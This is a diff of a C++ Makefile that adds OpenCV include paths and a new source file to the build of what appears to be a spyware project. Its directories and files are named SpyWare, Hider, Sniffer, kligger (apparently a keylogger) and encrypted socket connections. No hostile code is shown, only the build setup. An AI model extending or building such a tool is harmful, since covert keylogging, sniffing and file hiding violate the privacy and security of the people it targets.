@@ -4,7 +4,7 @@
 CC = g++
 
 # Compiler flags
-CFLAGS = -Wall -Wextra -std=c++17 -I/usr/include/libevdev-1.0/
+CFLAGS = -Wall -Wextra -std=c++17 -I/usr/include/libevdev-1.0/ -I/usr/include/opencv4
 
 MDIR = src/Maneger/
 HDIR = src/Hider/
@@ -13,7 +13,7 @@ SDIR = src/SpyWare/
 # Source files
 M_SRCS = src/Maneger/Connection.cpp src/Maneger/HiderManeger.cpp src/Maneger/main.cpp src/Maneger/SoftwareManeger.cpp src/IncludeCPP/encoding.cpp src/Maneger/SocketConnection.cpp src/Maneger/PipeConnection.cpp src/Maneger/BufferConnection.cpp src/IncludeCPP/getBasicInfo.cpp src/Maneger/EncSocketConnection.cpp
 H_SRCS = src/Hider/Hider.cpp src/Hider/HiddenFileHandler.cpp src/IncludeCPP/encoding.cpp
-S_SRCS = src/Maneger/Connection.cpp src/Maneger/HiderManeger.cpp src/SpyWare/main.cpp src/Maneger/SoftwareManeger.cpp src/IncludeCPP/encoding.cpp src/SpyWare/Contraption.cpp src/SpyWare/ContraptionAdmin.cpp src/SpyWare/Sniffer.cpp  src/Maneger/SocketConnection.cpp src/Maneger/PipeConnection.cpp src/Maneger/BufferConnection.cpp src/IncludeCPP/getBasicInfo.cpp src/SpyWare/kligger.cpp src/Maneger/EncSocketConnection.cpp
+S_SRCS = src/Maneger/Connection.cpp src/Maneger/HiderManeger.cpp src/SpyWare/main.cpp src/Maneger/SoftwareManeger.cpp src/IncludeCPP/encoding.cpp src/SpyWare/Contraption.cpp src/SpyWare/ContraptionAdmin.cpp src/SpyWare/Sniffer.cpp  src/Maneger/SocketConnection.cpp src/Maneger/PipeConnection.cpp src/Maneger/BufferConnection.cpp src/IncludeCPP/getBasicInfo.cpp src/SpyWare/kligger.cpp src/Maneger/EncSocketConnection.cpp src/SpyWare/bugg.cpp
 
 
 
